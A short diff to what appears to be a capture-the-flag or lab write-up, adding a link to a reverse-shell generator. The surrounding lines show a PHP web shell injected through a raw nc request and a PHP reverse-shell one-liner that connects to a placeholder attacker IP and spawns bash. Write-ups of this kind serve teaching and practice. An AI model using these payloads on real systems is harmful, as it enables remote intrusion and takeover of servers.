@@ -86,7 +86,7 @@ First request. this allow us to use the `cmd` parameter later to execute any php
 nc $ip 80
 GET /<?php system($_GET['cmd']);?>
 ```
-Next is searching php reverse shell, i use [this]() onliner shell. then urlencode it.
+Next is searching php reverse shell, i use [this](https://www.revshells.com/) onliner shell. then urlencode it.
 
 ```php
 php -r '$sock=fsockopen("<YOURIP>",<PORT>);exec("/bin/bash -i <&3 >&3 2>&3");'
